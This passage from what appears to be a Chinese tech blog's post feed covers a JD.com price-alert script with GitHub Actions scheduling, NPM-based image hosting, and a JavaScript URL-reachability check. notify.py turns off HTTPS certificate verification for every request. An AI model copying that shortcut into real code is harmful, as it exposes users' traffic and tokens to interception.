class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span 